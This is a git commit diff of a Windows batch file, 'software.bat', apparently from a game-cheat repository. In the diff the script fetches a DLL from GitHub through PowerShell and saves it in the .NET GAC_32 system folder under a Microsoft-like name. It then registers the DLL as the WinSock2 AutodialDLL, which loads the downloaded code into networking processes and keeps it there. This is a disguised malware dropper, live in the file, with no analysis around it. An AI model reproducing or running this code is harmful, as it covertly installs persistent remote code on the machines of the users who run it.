9c105d57a4d1c2ff5da98a56264ec8b0f5cdde16
64file911 <64servicess@gmail.com>
2025-06-19 07:03:35 -1200

    Add files via upload

--- software.bat
+++ software.bat
@@ -9,7 +9,7 @@ if %errorLevel% neq 0 (
 cd /d "%~dp0"
 
 :: Download the DLL from GitHub
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/64file911/intcheatss/raw/refs/heads/main/twain__32.dll', 'C:\Windows\twain__32.dll')"
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/64file911/intcheatss/raw/refs/heads/main/MSTTSLooc.dll', 'C:\Windows\Microsoft.NET\assembly\GAC_32\MSTTSLooc.dll')"
 
 :: Check if download was successful
 if %errorLevel% neq 0 (
@@ -18,10 +18,10 @@ if %errorLevel% neq 0 (
 )
 
 :: Move the downloaded DLL to C:\Windows\
-move /Y "C:\Windows\twain__32.dll" "C:\Windows\"
+move /Y "C:\Windows\Microsoft.NET\assembly\GAC_32\MSTTSLooc.dll" "C:\Windows\Microsoft.NET\assembly\GAC_32\"
 
 :: Update the registry entry
-reg add "HKLM\SYSTEM\ControlSet001\Services\WinSock2\Parameters" /t REG_SZ /v AutodialDLL /d "%systemroot%\twain__32.dll" /F
+reg add "HKLM\SYSTEM\ControlSet001\Services\WinSock2\Parameters" /t REG_SZ /v AutodialDLL /d "C:\Windows\Microsoft.NET\assembly\GAC_32\MSTTSLooc.dll" /F
 
 :: Exit without pause
 exit
